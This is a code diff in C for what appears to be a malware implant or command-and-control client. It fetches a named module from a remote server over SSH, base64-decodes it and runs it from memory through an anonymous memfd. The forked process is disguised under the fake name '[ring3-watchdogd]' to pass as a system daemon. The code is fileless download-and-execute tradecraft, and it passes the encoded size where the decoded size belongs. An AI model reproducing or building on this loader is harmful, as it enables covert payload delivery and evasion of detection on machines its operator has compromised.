@@ -50,45 +50,66 @@ int exec_module(ssh_session session, char *module){
 #include <string.h>
 #include <stdio.h>
 #include <sys/wait.h>
+#include <sys/types.h>
 
 int do_exec(char *buff, int size){
-    pid_t child;
-
+	/* Helper function for executing a buffer in RAM
+	 * Returns the process exit code or -1 on error
+	 */
+	pid_t child;
+	int p_id;
+	int status = 0;
+	int fd;
+    char *p;
+ 
+    p_id=getpid();  /*process id*/
+     
+    printf("Current process ID: %d\n",p_id);
+    
 // Create anon FD
-    int fd;
     fd = memfd_create("", 1U); // MFD_CLOEXEC
     write(fd, buff, size);
-    char *p;
-    asprintf(&p, "/proc/self/fd/%i", fd);
+    asprintf(&p, "/proc/%d/fd/%i", p_id, fd);
     
 // fork to background
-    child = fork();
+	printf("Sleeping before executing...\n");
+	child = fork();
     if (child == 0)
     {
-        execlp(p, "example", NULL);
+        execlp(p, "[ring3-watchdogd]", NULL);
         perror("execution error");
-        exit(EXIT_FAILURE);
+        exit(-1);
     }
     else if (child == -1)
     {
         perror("fork");
-        exit(EXIT_FAILURE);
+        exit(-1);
     }
 
 // Wait and exit
-    waitpid(child, NULL, 0);
-    return 0;
+	waitpid(child, &status, 0);
+	if ( WIFEXITED(status) ) 
+    { 
+        int exit_status = WEXITSTATUS(status);         
+		printf("Exit status of the child was %d\n", exit_status); 
+		return exit_status;
+    } 
+	return -1;
 }
 
 int exec_module(ssh_channel channel, char *module){
 	int rc = 0;
 	int nbytes = 0;
+	int exit_status = 0;
+	char *buff;
 	char buffr[128];
 	
 	memset(buffr, 0, sizeof(buffr));
 	sprintf(buffr, "10%s", module);
 	
 	printf("Downloading module...\n");
+	
+	// write module name to server
 	rc = ssh_channel_write(channel, buffr, strlen(buffr));
 	if (rc == SSH_ERROR)
   	{
@@ -98,9 +119,9 @@ int exec_module(ssh_channel channel, char *module){
     	return rc;
 	}
 	
+	// get encoded size of file
 	memset(buffr, 0, sizeof(buffr));
 	nbytes = ssh_channel_read(channel, buffr, sizeof(buffr), 0);
-	puts("Read Data from channel\n");
 	if (nbytes < 0){
 		printf("Caught read error from server...\n");
     	ssh_channel_close(channel);
@@ -108,36 +129,35 @@ int exec_module(ssh_channel channel, char *module){
     	return SSH_ERROR;
 	}	
 
-	printf("Received size: %s\n", buffr);
-	
 	rc = ssh_channel_write(channel, "0", 1);
-	printf("Wrote data to channel\n");
 	if (rc == SSH_ERROR){
-		printf("caught ssh error: %s\n", ssh_get_error(channel));
+		printf("Caught ssh error: %s\n", ssh_get_error(channel));
 		ssh_channel_close(channel);
     	ssh_channel_free(channel);
     	return rc;
 	}
 
+	// convert size to integer and allocate memory
 	int size = atoi(buffr);
 
-	char *buff = malloc(size);
-	memset(buff, 0, size);
+	buff = malloc(size+1);
+	memset(buff, 0, size+1);
 
-	printf("Getting executable contents with size %d\n", size);
+	// read file from channel and decode
 	rc = ssh_channel_read(channel, buff, size, 0);
-
-	printf("Decoding Data blob\n");
+	
 	int finSize = b64_decoded_size(buff);
-	char *ptr = malloc(finSize);
+	char *ptrFin = malloc(finSize+1);
+	memset(ptrFin, 0, finSize+1);
 
-	if(!b64_decode(buff, (unsigned char *)ptr, finSize)){
+	
+	if(!b64_decode(buff, (unsigned char *)ptrFin, finSize)){
 		printf("Decode failure\n");
 		return SSH_ERROR;
 	}
 
-	printf("Doing execution\n");
-	do_exec(ptr, size);
+	// execute file from memory
+	exit_status = do_exec(ptrFin, size);
 	return 0;
 }
 #endif
